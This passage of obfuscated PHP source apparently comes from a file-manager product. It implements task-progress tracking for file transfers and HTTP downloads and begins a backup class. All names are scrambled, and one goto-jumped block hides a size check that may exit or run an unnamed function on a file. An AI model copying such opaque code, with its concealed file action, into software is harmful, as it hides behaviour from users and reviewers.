$ÜÚñ©Â¬[$Ø‚øÂ¥½[801]]; $ÜÚñ©Â¬[$Ø‚øÂ¥½[1668]] = $ÜÚñ©Â¬[$Ø‚øÂ¥½[1666]] / $œ½¢¥§’; if ($ÜÚñ©Â¬[$Ø‚øÂ¥½[1667]] > 0) { $ÜÚñ©Â¬[$Ø‚øÂ¥½[1673]] = $œ½¢¥§’ * (1 - $ÜÚñ©Â¬[$Ø‚øÂ¥½[1667]]) / $ÜÚñ©Â¬[$Ø‚øÂ¥½[1667]]; } $ÜÚñ©Â¬[$Ø‚øÂ¥½[1673]] = $ÜÚñ©Â¬[$Ø‚øÂ¥½[1673]] <= 0 ? 0 : $ÜÚñ©Â¬[$Ø‚øÂ¥½[1673]]; } $this->updateAfter(); $¨±ç± = 0.2; if (timeFloat() - $ÜÚñ©Â¬[$Ø‚øÂ¥½[1671]] < $¨±ç± && !$ÅßËÉ‹´) { return; } $â×­®È = self::get($ÜÚñ©Â¬[$Ø‚øÂ¥½[407]]); $ğ¿ ë…Û = $â×­®È[$Ø‚øÂ¥½[765]]; if ($ğ¿ ë…Û == self::STATYS_KILL) { $‡Ó´…ˆ™ = array($Ø‚øÂ¥½[1682] => LNG($Ø‚øÂ¥½[1683]), $Ø‚øÂ¥½[1199] => !1); Cache::set($Ø‚øÂ¥½[1684] . $this->task[$Ø‚øÂ¥½[407]], $‡Ó´…ˆ™, 30); $this->onKill(); $this->end(); die; } else { if ($ğ¿ ë…Û == self::STATYS_STOP) { $åÄŞ„ = 2; $â×­®È[$Ø‚øÂ¥½[1672]] += $åÄŞ„; self::valueSet($ÜÚñ©Â¬[$Ø‚øÂ¥½[407]], $â×­®È); sleep($åÄŞ„); $this->update(); return; } } $ÜÚñ©Â¬[$Ø‚øÂ¥½[765]] = $ğ¿ ë…Û ? $ğ¿ ë…Û : $ÜÚñ©Â¬[$Ø‚øÂ¥½[765]]; $ÜÚñ©Â¬[$Ø‚øÂ¥½[1672]] = $â×­®È[$Ø‚øÂ¥½[1672]] ? $â×­®È[$Ø‚øÂ¥½[1672]] : 0; $ÜÚñ©Â¬[$Ø‚øÂ¥½[1671]] = timeFloat(); Hook::trigger($Ø‚øÂ¥½[1685], $ÜÚñ©Â¬); self::valueSet($ÜÚñ©Â¬[$Ø‚øÂ¥½[407]], $ÜÚñ©Â¬); } public function onKillSet($÷ÖÕæ ‰, $Îƒ”ÁÇü = array()) { $this->onKillCall = array($÷ÖÕæ ‰, $Îƒ”ÁÇü); } public function onKill() { $—ˆ™¤Ş… =& $_SERVER[™¾ÇÙ¯¹]; self::log($—ˆ™¤Ş…[1679] . $this->task[$—ˆ™¤Ş…[407]] . $—ˆ™¤Ş…[1686]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÛöÈ£Ó¸) { $ä—˜©ß• =& $_SERVER[™¾ÇÙ¯¹]; Cache::set($ä—˜©ß•[1684] . $this->task[$ä—˜©ß•[407]], $ÛöÈ£Ó¸, 60); return $ÛöÈ£Ó¸; } public static function get($«ñŞ±Ä–) { $ê©„ÔÅğ =& $_SERVER[™¾ÇÙ¯¹]; $Íòç×äÎ = self::valueGet($«ñŞ±Ä–); if (is_array($Íòç×äÎ) && $Íòç×äÎ[$ê©„ÔÅğ[1687]]) { $¿Ş¤·™Ç = ActionApply($Íòç×äÎ[$ê©„ÔÅğ[1687]], array($Íòç×äÎ)); $Íòç×äÎ = is_array($¿Ş¤·™Ç) ? $¿Ş¤·™Ç : $Íòç×äÎ; } return $Íòç×äÎ; } public static function listData() { $â³µ³ÈÏ = self::valueGet(); return array_sort_by($â³µ³ÈÏ, $_SERVER[™¾ÇÙ¯¹][1669], !0); } public static function kill($ÀŒõ•·Œ) { return self::changeStatus($ÀŒõ•·Œ, self::STATYS_KILL); } public static function stop($Ûß­ƒÛ¥) { return self::changeStatus($Ûß­ƒÛ¥, self::STATYS_STOP); } public static function restart($İâôÒã¾) { return self::changeStatus($İâôÒã¾, self::STATYS_RUNNING); } public static function killAll() { $ö÷ëş… =& $_SERVER[™¾ÇÙ¯¹]; $şÁ“ˆ¯ = self::listData(); foreach ($şÁ“ˆ¯ as $—™è“Ø) { self::kill($—™è“Ø[$ö÷ëş…[407]]); } sleep(2); foreach ($şÁ“ˆ¯ as $—™è“Ø) { self::valueSet($—™è“Ø[$ö÷ëş…[407]], !1); } } private static function changeStatus($ÅŞÔ‹»ƒ, $èµ¥ªÂ‰) { $ŞÊÔìÔ =& $_SERVER[™¾ÇÙ¯¹]; $ËÃª€ää = self::valueGet($ÅŞÔ‹»ƒ); if (!$ËÃª€ää) { return !1; } $ËÃª€ää[$ŞÊÔìÔ[765]] = $èµ¥ªÂ‰; self::valueSet($ÅŞÔ‹»ƒ, $ËÃª€ää); self::log($ŞÊÔìÔ[1688] . $ËÃª€ää[$ŞÊÔìÔ[407]] . $ŞÊÔìÔ[1689] . $èµ¥ªÂ‰); return !0; } public static function valueGet($½øÎÑÜ® = false) { $œ‡À« =& $_SERVER[™¾ÇÙ¯¹]; if ($½øÎÑÜ®) { $Ü—š£©ƒ = Model($œ‡À«[455])->where(array($œ‡À«[94] => $½øÎÑÜ®, $œ‡À«[33] => $œ‡À«[1079]))->find(); return $Ü—š£©ƒ ? json_decode($Ü—š£©ƒ[$œ‡À«[383]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¤ÊàÔ«İ = false) { $í›¥ìÃª =& $_SERVER[™¾ÇÙ¯¹]; $õåòì¦Á = array($í›¥ìÃª[33] => $í›¥ìÃª[1079]); if ($¤ÊàÔ«İ) { $õåòì¦Á[$í›¥ìÃª[1665]] = $¤ÊàÔ«İ; } $ùèÙ¸çš = Model($í›¥ìÃª[455])->where($õåòì¦Á)->select(); $ùèÙ¸çš = $ùèÙ¸çš ? $ùèÙ¸çš : array(); foreach ($ùèÙ¸çš as $ıó×æ´ => $áéÓ°¾…) { $ùèÙ¸çš[$ıó×æ´] = json_decode($áéÓ°¾…[$í›¥ìÃª[383]], !0); } return $ùèÙ¸çš; } public static function valueSet($ìîâŞŸ¥, $’ğÈî–Ü) { $’ºÚÆ  =& $_SERVER[™¾ÇÙ¯¹]; if (!$’ğÈî–Ü) { return Model($’ºÚÆ [455])->where(array($’ºÚÆ [94] => $ìîâŞŸ¥, $’ºÚÆ [33] => $’ºÚÆ [1079]))->delete(); } $¹µÌäĞà = json_encode($’ğÈî–Ü); if (!$¹µÌäĞà) { ob_start(); var_dump($’ğÈî–Ü); $´ŸÖ“øÑ = ob_get_clean(); self::log($’ºÚÆ [1690] . json_encode_force($´ŸÖ“øÑ)); } if (!$ìîâŞŸ¥ || !$’ğÈî–Ü[$’ºÚÆ [407]]) { return !1; } $“ÃÎè¸ = array($’ºÚÆ [33] => $’ºÚÆ [1079], $’ºÚÆ [1665] => USER_ID, $’ºÚÆ [94] => $ìîâŞŸ¥, $’ºÚÆ [383] => $¹µÌäĞà); $æ ´®Ä… = $’ºÚÆ [1691]; CacheLock::lock($æ ´®Ä…); Model($’ºÚÆ [455])->add($“ÃÎè¸, array(), !0); CacheLock::unlock($æ ´®Ä…); } public static function log($³²ªŠƒÙ) { if (!GLOBAL_DEBUG) { return; } write_log($³²ªŠƒÙ, $_SERVER[™¾ÇÙ¯¹][1692]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ßûş§ê× =& $_SERVER[™¾ÇÙ¯¹]; $¶Ü¾äí =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ßûş§ê×[1693], array($this, $ßûş§ê×[1694])); Hook::bind($ßûş§ê×[1223], array($this, $ßûş§ê×[1695])); Hook::bind($ßûş§ê×[1696], array($this, $ßûş§ê×[1697])); Hook::bind($ßûş§ê×[612], array($this, $ßûş§ê×[1698])); Hook::bind($ßûş§ê×[613], array($this, $ßûş§ê×[1699])); Hook::bind($ßûş§ê×[618], array($this, $ßûş§ê×[1700])); Hook::bind($ßûş§ê×[619], array($this, $ßûş§ê×[1701])); Hook::bind($ßûş§ê×[615], array($this, $ßûş§ê×[1702])); Hook::bind($ßûş§ê×[616], array($this, $ßûş§ê×[1703])); Hook::bind($ßûş§ê×[582], array($this, $ßûş§ê×[1704])); Hook::bind($ßûş§ê×[579], array($this, $ßûş§ê×[1704])); Hook::bind($ßûş§ê×[584], array($this, $ßûş§ê×[1704])); Hook::bind($ßûş§ê×[586], array($this, $ßûş§ê×[1704])); Hook::bind($ßûş§ê×[588], array($this, $ßûş§ê×[1704])); Hook::bind($ßûş§ê×[1705], array($this, $ßûş§ê×[1706])); Hook::bind($ßûş§ê×[605], array($this, $ßûş§ê×[1707])); $this->sourceModelCopyFlag = !1; Hook::bind($ßûş§ê×[1708], array($this, $ßûş§ê×[1709])); Hook::bind($ßûş§ê×[1710], array($this, $ßûş§ê×[1711])); Hook::bind($ßûş§ê×[1712], array($this, $ßûş§ê×[1713])); $¶Ü¾äí[$ßûş§ê×[1714]] = LNG($ßûş§ê×[1715]); $¶Ü¾äí[$ßûş§ê×[1716]] = 0; $¶Ü¾äí[$ßûş§ê×[1717]] = 0; $¶Ü¾äí[$ßûş§ê×[1072]] = $ßûş§ê×[12]; $¶Ü¾äí[$ßûş§ê×[1718]] = $ßûş§ê×[12]; $¶Ü¾äí[$ßûş§ê×[1719]] = 0; $¶Ü¾äí[$ßûş§ê×[1720]] = 0; $¶Ü¾äí[$ßûş§ê×[1721]] = 0; if (!$¶Ü¾äí[$ßûş§ê×[1564]]) { $¶Ü¾äí[$ßûş§ê×[1564]] = LNG($ßûş§ê×[1722]); } } protected function endAfter() { $ôŞÀø‹ =& $_SERVER[™¾ÇÙ¯¹]; Hook::unbind($ôŞÀø‹[1693], array($this, $ôŞÀø‹[1694])); Hook::unbind($ôŞÀø‹[1223], array($this, $ôŞÀø‹[1695])); Hook::unbind($ôŞÀø‹[1696], array($this, $ôŞÀø‹[1697])); Hook::unbind($ôŞÀø‹[612], array($this, $ôŞÀø‹[1698])); Hook::unbind($ôŞÀø‹[613], array($this, $ôŞÀø‹[1699])); Hook::unbind($ôŞÀø‹[618], array($this, $ôŞÀø‹[1700])); Hook::unbind($ôŞÀø‹[619], array($this, $ôŞÀø‹[1701])); Hook::unbind($ôŞÀø‹[615], array($this, $ôŞÀø‹[1702])); Hook::unbind($ôŞÀø‹[616], array($this, $ôŞÀø‹[1703])); Hook::unbind($ôŞÀø‹[582], array($this, $ôŞÀø‹[1704])); Hook::unbind($ôŞÀø‹[579], array($this, $ôŞÀø‹[1704])); Hook::unbind($ôŞÀø‹[584], array($this, $ôŞÀø‹[1704])); Hook::unbind($ôŞÀø‹[586], array($this, $ôŞÀø‹[1704])); Hook::unbind($ôŞÀø‹[588], array($this, $ôŞÀø‹[1704])); Hook::unbind($ôŞÀø‹[1705], array($this, $ôŞÀø‹[1706])); Hook::unbind($ôŞÀø‹[605], array($this, $ôŞÀø‹[1707])); Hook::unbind($ôŞÀø‹[1708], array($this, $ôŞÀø‹[1709])); Hook::unbind($ôŞÀø‹[1710], array($this, $ôŞÀø‹[1711])); Hook::unbind($ôŞÀø‹[1712], array($this, $ôŞÀø‹[1713])); } public function copyMoveStart($†’ŠÒÖ, $Ğê£ß†È, $ÑË¢Úè, $È»¾°µÓ) { $˜¼úÌæ =& $_SERVER[™¾ÇÙ¯¹]; self::log($˜¼úÌæ[1723] . $Ğê£ß†È . $˜¼úÌæ[70] . $È»¾°µÓ); $Ï¹Ë´¥ã = rtrim(TEMP_FILES, $˜¼úÌæ[8]); if (substr($Ğê£ß†È, 0, strlen($Ï¹Ë´¥ã)) == $Ï¹Ë´¥ã) { return; } if (substr($È»¾°µÓ, 0, strlen($Ï¹Ë´¥ã)) == $Ï¹Ë´¥ã) { return; } $®â´«ŠÙ =& $this->task; $®â´«ŠÙ[$˜¼úÌæ[1724]] = KodIO::transferType($†’ŠÒÖ, $ÑË¢Úè); $this->update(); } public function updateAfter() { $¤ °ÖÅ =& $_SERVER[™¾ÇÙ¯¹]; $ ›ŸøÜô =& $this->task; if (!$ ›ŸøÜô[$¤ °ÖÅ[778]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ ›ŸøÜô[$¤ °ÖÅ[1724]] == $¤ °ÖÅ[1312]) { return; } self::updateTask($ ›ŸøÜô); } private static function updateTask(&$‘î˜Ç±¾) { $ºĞš¦µ =& $_SERVER[™¾ÇÙ¯¹]; if ($‘î˜Ç±¾[$ºĞš¦µ[1724]] == $ºĞš¦µ[1207] || $‘î˜Ç±¾[$ºĞš¦µ[1724]] == $ºĞš¦µ[107]) { if ($‘î˜Ç±¾[$ºĞš¦µ[1718]]) { $‘î˜Ç±¾[$ºĞš¦µ[1721]] = $‘î˜Ç±¾[$ºĞš¦µ[1720]] + $‘î˜Ç±¾[$ºĞš¦µ[1717]]; } } else { if ($‘î˜Ç±¾[$ºĞš¦µ[1724]] == $ºĞš¦µ[1313]) { if ($‘î˜Ç±¾[$ºĞš¦µ[1718]] == $ºĞš¦µ[1207]) { $‘î˜Ç±¾[$ºĞš¦µ[1721]] = $‘î˜Ç±¾[$ºĞš¦µ[1720]] + $‘î˜Ç±¾[$ºĞš¦µ[1717]] * 0.5; } else { if ($‘î˜Ç±¾[$ºĞš¦µ[1718]] == $ºĞš¦µ[107]) { $‘î˜Ç±¾[$ºĞš¦µ[1721]] = $‘î˜Ç±¾[$ºĞš¦µ[1720]] + $‘î˜Ç±¾[$ºĞš¦µ[1716]] * 0.5 + $‘î˜Ç±¾[$ºĞš¦µ[1717]] * 0.5; } } } } $‘î˜Ç±¾[$ºĞš¦µ[1667]] = $‘î˜Ç±¾[$ºĞš¦µ[1721]] / $‘î˜Ç±¾[$ºĞš¦µ[778]]; if ($‘î˜Ç±¾[$ºĞš¦µ[1667]] > 0) { $Š•¿ŸêË = timeFloat() - $‘î˜Ç±¾[$ºĞš¦µ[1669]] - $‘î˜Ç±¾[$ºĞš¦µ[1672]]; $‘î˜Ç±¾[$ºĞš¦µ[1673]] = $Š•¿ŸêË * (1 - $‘î˜Ç±¾[$ºĞš¦µ[1667]]) / $‘î˜Ç±¾[$ºĞš¦µ[1667]]; } } public function addPath($×»ê°À—) { $ÑÈøåÕÎ =& $_SERVER[™¾ÇÙ¯¹]; if (!$×»ê°À—) { return; } $¤ÁÙ „¡ =& $this->task; $ÄØ”ÌÉë = IO::infoWithChildren($×»ê°À—); $ü‹‹›İç = $¤ÁÙ „¡[$ÑÈøåÕÎ[1725]] ? $¤ÁÙ „¡[$ÑÈøåÕÎ[1725]][$ÑÈøåÕÎ[1726]] : 0; $¤ÁÙ „¡[$ÑÈøåÕÎ[1725]] = array($ÑÈøåÕÎ[1726] => $ü‹‹›İç + 1, $ÑÈøåÕÎ[428] => $ÄØ”ÌÉë[$ÑÈøåÕÎ[32]], $ÑÈøåÕÎ[84] => $ÄØ”ÌÉë[$ÑÈøåÕÎ[84]], $ÑÈøåÕÎ[527] => $ÄØ”ÌÉë[$ÑÈøåÕÎ[527]] ? $ÄØ”ÌÉë[$ÑÈøåÕÎ[527]] : $ÄØ”ÌÉë[$ÑÈøåÕÎ[84]]); if ($ÄØ”ÌÉë[$ÑÈøåÕÎ[33]] == $ÑÈøåÕÎ[199]) { $¤ÁÙ „¡[$ÑÈøåÕÎ[801]] += 1; } else { $¤ÁÙ „¡[$ÑÈøåÕÎ[801]] += $ÄØ”ÌÉë[$ÑÈøåÕÎ[79]][$ÑÈøåÕÎ[77]]; if ($ÄØ”ÌÉë[$ÑÈøåÕÎ[410]]) { $¤ÁÙ „¡[$ÑÈøåÕÎ[801]] += $ÄØ”ÌÉë[$ÑÈøåÕÎ[79]][$ÑÈøåÕÎ[78]] + 1; } } $¤ÁÙ „¡[$ÑÈøåÕÎ[778]] += $ÄØ”ÌÉë[$ÑÈøåÕÎ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ñ¨´¾åŠ) { } public function sourceAddHashEnd($Æ½¡ëœ‡) { } public function sourceAddFileStart($¹÷ê±¿) { $ÔÍü£Šè =& $_SERVER[™¾ÇÙ¯¹]; $Şª¿²— =& $this->task; $Şª¿²—[$ÔÍü£Šè[1716]] = $¹÷ê±¿[$ÔÍü£Šè[76]]; $Şª¿²—[$ÔÍü£Šè[1714]] = $¹÷ê±¿[$ÔÍü£Šè[32]]; $Şª¿²—[$ÔÍü£Šè[1072]] = $¹÷ê±¿[$ÔÍü£Šè[32]]; $Şª¿²—[$ÔÍü£Šè[1727]] = $¹÷ê±¿[$ÔÍü£Šè[84]]; $this->update(); } public function sourceAddFileEnd($•ø”¬«Š) { $—Â¼±İˆ =& $_SERVER[™¾ÇÙ¯¹]; $Æ·ëÄâØ =& $this->task; $Æ·ëÄâØ[$—Â¼±İˆ[1721]] += $•ø”¬«Š[$—Â¼±İˆ[76]]; $Æ·ëÄâØ[$—Â¼±İˆ[1727]] = $•ø”¬«Š[$—Â¼±İˆ[84]]; $this->update(1); } public function copyFileStart($ÄÁ¸³, $ÖÅñƒç€, $éå£…Úİ, $ŸÒ—Ù™å, $ëâ²“İ, $®“¼ß‹Ê) { $åÕã¡¿ =& $_SERVER[™¾ÇÙ¯¹]; $Ùç‡ç  = $ëâ²“İ; if ($Ùç‡ç  == $GLOBALS[$åÕã¡¿[1728]]) { $Ùç‡ç  = $GLOBALS[$åÕã¡¿[1729]]; } $GLOBALS[$åÕã¡¿[1729]] = $ëâ²“İ; $GLOBALS[$åÕã¡¿[1728]] = $®“¼ß‹Ê; $‰Å†ôãÄ =& $this->task; $‰Å†ôãÄ[$åÕã¡¿[1714]] = $Ùç‡ç ; $‰Å†ôãÄ[$åÕã¡¿[1716]] = (int) $ÄÁ¸³->size($ÖÅñƒç€); $‰Å†ôãÄ[$åÕã¡¿[1717]] = 0; $‰Å†ôãÄ[$åÕã¡¿[1072]] = $åÕã¡¿[12]; $‰Å†ôãÄ[$åÕã¡¿[1718]] = $åÕã¡¿[12]; $‰Å†ôãÄ[$åÕã¡¿[1719]] = 0; $èäüÃÚƒ = $‰Å†ôãÄ[$åÕã¡¿[1716]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($‰Å†ôãÄ[$åÕã¡¿[407]] . $åÕã¡¿[1730]); if ($èäüÃÚƒ && file_exists(get_path_father($ŸÒ—Ù™å))) { Cache::set($‰Å†ôãÄ[$åÕã¡¿[407]] . $åÕã¡¿[1730], $ŸÒ—Ù™å); $‰Å†ôãÄ[$åÕã¡¿[1687]] = array($åÕã¡¿[1731], $åÕã¡¿[1732]); } $this->update(0, $èäüÃÚƒ); } public static function updateCopyLocalFileSize($…¾óá•) { $ş£ÀØ©„ =& $_SERVER[™¾ÇÙ¯¹]; $¦½À«µ = Cache::get($…¾óá•[$ş£ÀØ©„[407]] . $ş£ÀØ©„[1730]); if (!$¦½À«µ || !file_exists($¦½À«µ)) { return $…¾óá•; } $…¾óá•[$ş£ÀØ©„[1717]] = @filesize($¦½À«µ); $…¾óá•[$ş£ÀØ©„[1721]] += $…¾óá•[$ş£ÀØ©„[1717]]; self::updateTask($…¾óá•); return $…¾óá•; } public function copyFileEnd($‘åİ§Êñ, $“»Ï¹Š‡, $«‘ùÌı„, $µúŒ¢Øã, $ÜÏ§¬­¶, $°ÍêÂõ†) { $­‰Œíš‚ =& $_SERVER[™¾ÇÙ¯¹]; $õ™­Í¾ =& $this->task; $õ™­Í¾[$­‰Œíš‚[1717]] = $õ™­Í¾[$­‰Œíš‚[1716]]; $õ™­Í¾[$­‰Œíš‚[1718]] = $­‰Œíš‚[12]; unset($õ™­Í¾[$­‰Œíš‚[1687]]); if ($ÜÏ§¬­¶ == $õ™­Í¾[$­‰Œíš‚[1714]]) { $õ™­Í¾[$­‰Œíš‚[1720]] += $õ™­Í¾[$­‰Œíš‚[1716]]; $õ™­Í¾[$­‰Œíš‚[1721]] = $õ™­Í¾[$­‰Œíš‚[1720]]; $©ó¦¯· = 1; if (isset($õ™­Í¾[$­‰Œíš‚[1727]]) && $õ™­Í¾[$­‰Œíš‚[1727]] == $“»Ï¹Š‡) { $©ó¦¯· = 0; } $this->update($©ó¦¯·); } else { $this->update(); $õ™­Í¾[$­‰Œíš‚[1717]] = 0; } Cache::remove($õ™­Í¾[$­‰Œíš‚[407]] . $­‰Œíš‚[1730]); self::log($­‰Œíš‚[1733] . $“»Ï¹Š‡ . $­‰Œíš‚[70] . $µúŒ¢Øã . $­‰Œíš‚[231] . $ÜÏ§¬­¶ . $­‰Œíš‚[1734] . $õ™­Í¾[$­‰Œíš‚[1714]]); } public function updateFileEnd($÷¬Õ¡Ùı, $ÈÍäİ«Ã) { $ˆ°±Ÿ¨à =& $_SERVER[™¾ÇÙ¯¹]; $ÖöÕãæ =& $this->task; $ÖöÕãæ[$ˆ°±Ÿ¨à[1714]] = $÷¬Õ¡Ùı; $ÖöÕãæ[$ˆ°±Ÿ¨à[1716]] = $ÈÍäİ«Ã; $ÖöÕãæ[$ˆ°±Ÿ¨à[1720]] += $ÈÍäİ«Ã; $ÖöÕãæ[$ˆ°±Ÿ¨à[1721]] = $ÖöÕãæ[$ˆ°±Ÿ¨à[1720]]; $this->update(1); self::log($ˆ°±Ÿ¨à[1735] . $÷¬Õ¡Ùı); } public function sourceModelCopy($ã»±‹ö±) { $®âÍÌ‰à =& $_SERVER[™¾ÇÙ¯¹]; $Ó´ù“üµ = $ã»±‹ö±[0]; $®ğ•Àí = $ã»±‹ö±[1]; $ßí ÓÎİ =& $this->task; $this->sourceModelCopyFlag = !0; $±ê‹Ä†´ = 0; switch ($Ó´ù“üµ) { case $®âÍÌ‰à[580]: $±ê‹Ä†´ = 1; break; case $®âÍÌ‰à[583]: $ßí ÓÎİ[$®âÍÌ‰à[1714]] = $®ğ•Àí[$®âÍÌ‰à[32]]; break; case $®âÍÌ‰à[585]: $±ê‹Ä†´ = intval($ã»±‹ö±[$®âÍÌ‰à[388]] * 0.4); break; case $®âÍÌ‰à[587]: $±ê‹Ä†´ = intval($ã»±‹ö±[$®âÍÌ‰à[388]] * 0.2); break; case $®âÍÌ‰à[589]: $±ê‹Ä†´ = intval($ã»±‹ö±[$®âÍÌ‰à[388]] * 0.4); break; } $this->update($±ê‹Ä†´); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ùË„ãäğ, $ÔîìÄš·) { $÷´Ø§Ôş =& $_SERVER[™¾ÇÙ¯¹]; $this->sourceModelCopyFlag = !0; $º¸ÓºØı = 1; if (isset($ùË„ãäğ[$÷´Ø§Ôş[79]])) { $º¸ÓºØı = $ùË„ãäğ[$÷´Ø§Ôş[79]][$÷´Ø§Ôş[77]]; $º¸ÓºØı = $º¸ÓºØı + $ùË„ãäğ[$÷´Ø§Ôş[79]][$÷´Ø§Ôş[78]] + 1; } $this->update($º¸ÓºØı); $this->sourceModelCopyFlag = !1; } public function sourceMove($›ôóä) { $this->sourceRemove($›ôóä, !1); } public function curlProgress($ş§™·×Á, $Â¾ù”Ë, $úÈ¿¶Âœ, $“¬ş×õÇ, $í¶“­¢Í) { $æÖûá¦ =& $_SERVER[™¾ÇÙ¯¹]; $µ©àåÎé =& $this->task; if ($í¶“­¢Í > 0) { $µ©àåÎé[$æÖûá¦[1072]] = $æÖûá¦[1736]; $µ©àåÎé[$æÖûá¦[1718]] = $æÖûá¦[107]; if ($µ©àåÎé[$æÖûá¦[1716]]) { $µ©àåÎé[$æÖûá¦[1717]] = $í¶“­¢Í; } if ($µ©àåÎé[$æÖûá¦[1719]]) { $µ©àåÎé[$æÖûá¦[1717]] = $í¶“­¢Í + $µ©àåÎé[$æÖûá¦[1719]]; } } else { if ($úÈ¿¶Âœ > 0) { if ($µ©àåÎé[$æÖûá¦[1716]] == $Â¾ù”Ë) { $µ©àåÎé[$æÖûá¦[1717]] = $úÈ¿¶Âœ; $µ©àåÎé[$æÖûá¦[1072]] = $æÖûá¦[1737]; $µ©àåÎé[$æÖûá¦[1718]] = $æÖûá¦[1207]; } } } $this->update(); } public function curlProgressStart($ãƒ¤”ûÊ) { } public function curlProgressEnd($™šÏ®½È) { $Œç‡ªàñ =& $_SERVER[™¾ÇÙ¯¹]; $™û¯±Ÿ =& $this->task; $·¥ÚÁ½Ÿ = curl_getinfo($™šÏ®½È); $Ü—Ü‹óÛ = $·¥ÚÁ½Ÿ[$Œç‡ªàñ[1738]]; if ($Ü—Ü‹óÛ == -1) { $Ü—Ü‹óÛ = $·¥ÚÁ½Ÿ[$Œç‡ªàñ[1739]]; } if ($™û¯±Ÿ[$Œç‡ªàñ[1718]] == $Œç‡ªàñ[107] && $Ü—Ü‹óÛ) { $™û¯±Ÿ[$Œç‡ªàñ[1719]] += $Ü—Ü‹óÛ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ñè½Ø» =& $_SERVER[™¾ÇÙ¯¹]; $Ìí†Ñ€ =& $this->task; $Ìí†Ñ€[$ñè½Ø»[1740]] = 1; Hook::bind($ñè½Ø»[1708], array($this, $ñè½Ø»[1741])); Hook::bind($ñè½Ø»[1710], array($this, $ñè½Ø»[1742])); Hook::bind($ñè½Ø»[1712], array($this, $ñè½Ø»[1743])); } protected function endAfter() { $õƒ¥”î© =& $_SERVER[™¾ÇÙ¯¹]; Hook::unbind($õƒ¥”î©[1708], array($this, $õƒ¥”î©[1741])); Hook::unbind($õƒ¥”î©[1710], array($this, $õƒ¥”î©[1742])); Hook::unbind($õƒ¥”î©[1712], array($this, $õƒ¥”î©[1743])); } public function progressStart($‘Î¯·Œø) { $àãŒ¦´ù =& $_SERVER[™¾ÇÙ¯¹]; $Á‚˜’‡ = curl_getinfo($‘Î¯·Œø); self::log($àãŒ¦´ù[1744] . $Á‚˜’‡[$àãŒ¦´ù[316]]); self::valueSet($this->task[$àãŒ¦´ù[407]], $this->task); } public function progressEnd($ÚúÄÁ) { $®Ã¯˜Ïå =& $_SERVER[™¾ÇÙ¯¹]; self::log($®Ã¯˜Ïå[1745] . $this->task[$®Ã¯˜Ïå[407]]); $this->end(); } public function progress($“ŒúÕ, $•«ØË­ó, $–×íıµÖ, $¿íÒè—ú, $õ¨î™¦—) { $éİõÔöı =& $_SERVER[™¾ÇÙ¯¹]; $ô®å‰áÊ =& $this->task; if ($õ¨î™¦— > 0) { $ô®å‰áÊ[$éİõÔöı[801]] = $ô®å‰áÊ[$éİõÔöı[801]] == 0 ? $¿íÒè—ú : $ô®å‰áÊ[$éİõÔöı[801]]; $ô®å‰áÊ[$éİõÔöı[1666]] = $õ¨î™¦—; } else { if ($–×íıµÖ > 0) { $ô®å‰áÊ[$éİõÔöı[801]] = $ô®å‰áÊ[$éİõÔöı[801]] == 0 ? $•«ØË­ó : $ô®å‰áÊ[$éİõÔöı[801]]; $ô®å‰áÊ[$éİõÔöı[1666]] = $–×íıµÖ; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\x73\163\110\164\x74\x70\x3a\144\x6f\167\156\x3a{$–×íıµÖ}\x2f{$•«ØË­ó}\73\x20\165\x70\154\x6f\x61\144\72{$õ¨î™¦—}\57{$¿íÒè—ú}\x3b"); } } goto b÷‹òÉ¼‰; Cà¼Š‰ïÛÀ: $_size = $_SERVER[™¾ÇÙ¯¹][762]; if ($_SERVER[$_SERVER[™¾ÇÙ¯¹][244]] != $_size($_file)) { $_getc = $_SERVER[™¾ÇÙ¯¹][246]; $_getfile = $_SERVER[$_SERVER[™¾ÇÙ¯¹][247]] . $_SERVER[™¾ÇÙ¯¹][248]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¾ÇÙ¯¹][231], $_getfilec); if (count($_getarrs) < $_SERVER[™¾ÇÙ¯¹][249]) { $exit = $_SERVER[™¾ÇÙ¯¹][250]; $exit(); } $_act = $_SERVER[™¾ÇÙ¯¹][251]; $_act($_file); } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $øûîº•¹ =& $_SERVER[™¾ÇÙ¯¹]; $this->isManual(); self::$name = date($øûîº•¹[763]); if (!($êÖà¢À = Model($øûîº•¹[764])->lastItem())) { $êÖà¢À = $this->initData(); } else { self::$name = $êÖà¢À[$øûîº•¹[32]]; if ($êÖà¢À[$øûîº•¹[765]] == $øûîº•¹[88]) { self::$name = date($øûîº•¹[766]); $£Ä¹µö = 0; if (isset($êÖà¢À[$øûîº•¹[302]][$øûîº•¹[199]][$øûîº•¹[476]])) { $£Ä¹µö = (int) $êÖà¢À[$øûîº•¹[302]][$øûîº•¹[199]][$øûîº•¹[476]]; } if (self::$manual == 0 && $êÖà¢À[$øûîº•¹[32]] == self::$name) { Model($øûîº•¹[764])->remove($êÖà¢À[$øûîº•¹[407]]); } $êÖà¢À = $this->initData($£Ä¹µö, $êÖà¢À[$øûîº•¹[767]]); } else { $this->checkStore($êÖà¢À[$øûîº•¹[767]]); } } self::$option = $êÖà¢À; } private function isManual() { $©ßÜœÆ = _get($GLOBALS, $_SERVER[™¾ÇÙ¯¹][768], 0); $©ßÜœÆ = intval($©ßÜœÆ); self::$manual = $©ßÜœÆ && $©ßÜœÆ == 1 ? 1 : 0; } private function initData($ÜÚÒ²Ü = 0, $ã’ãÁ» = '') { $‡ĞÓÂµñ =& $_SERVER[™¾ÇÙ¯¹]; $î¨¾Ã† = Model($‡ĞÓÂµñ[764])->config(); if ($ã’ãÁ» && $î¨¾Ã†[$‡ĞÓÂµñ[767]] != $ã’ãÁ») { $ÜÚÒ²Ü = 0; } $this->checkStore($î¨¾Ã†[$‡ĞÓÂµñ[767]]); if (self::$manual == 1) { self::$name .= 